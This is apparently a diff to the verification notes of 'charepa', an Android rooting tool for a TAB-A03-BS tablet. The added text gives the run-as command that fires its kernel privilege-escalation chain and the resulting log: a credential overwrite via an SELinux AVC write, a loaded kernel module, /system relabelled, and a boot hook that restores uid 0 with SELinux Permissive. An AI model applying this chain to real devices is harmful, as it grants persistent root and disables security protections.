@@ -17,9 +17,37 @@ Everything below was measured on a TAB-A03-BS (Android 5.1, kernel 3.10.33
 | Running twice is safe | a unit whose hook is already installed answers `EEXIST` from `init_module`; that now counts as success, so the second run reports `already rooted` and `RESULT ROOT uid=0` instead of a false failure |
 | The 4-byte write works at all | `charepa validate` prints `VALIDATE PASS` from inside the app, including on the binary CI produced |
 
-The shipped `charepa.apk` was measured as the whole deliverable: installed on a
-unit with no hook, `am start --es mode all` reached `RESULT ROOT uid=0` with
-`終了コード 0`, using nothing but the three assets inside the APK.
+The shipped `charepa.apk` was measured as the whole deliverable, twice.
+
+Start from an unrooted unit — `/system/bin/debuggerd` back to its original,
+`/system/lib/modules/myroot.ko` absent, no `/proc/myroot`, `Enforcing` — and
+install only the APK. Then run its own staged copy:
+
+```
+run-as com.charepa /data/data/com.charepa/files/bin/charepa all \
+        02000000 40000000 2048 2600
+```
+
+With nothing pushed from the host, attempt 6 reached the whole chain:
+
+```
+cred=0xffffffc02c8fcc00 eff=0x80010000 module_errno=1
+AVC win phys=0x2c68cc00 off=704 probes=746508 stores=2415
+after avc: module_errno=8 (8 = capability check passed)
+init_module rc=0 errno=0 (156576 bytes)
+hook: /system is rw
+hook: /system/bin/debuggerd relabelled to u:object_r:system_file:s0
+```
+
+A reboot then brought root back through the payload:
+
+```
+CHAREPA_BOOT: context=u:r:init:s0
+CHAREPA_BOOT: init_module rc=0 errno=0 (Success) bytes=156576
+CHAREPA_BOOT: write /proc/myroot rc=1 errno=0 uid now 0
+```
+
+and `echo 1 > /proc/myroot` answered `uid=0(root) ... Permissive`.
 
 TAB-A03-BR2 is **not** verified. The partitions are the same shape as BS
 (`system` p16, `boot` p15, `recovery` p7), and the two models share USB ID
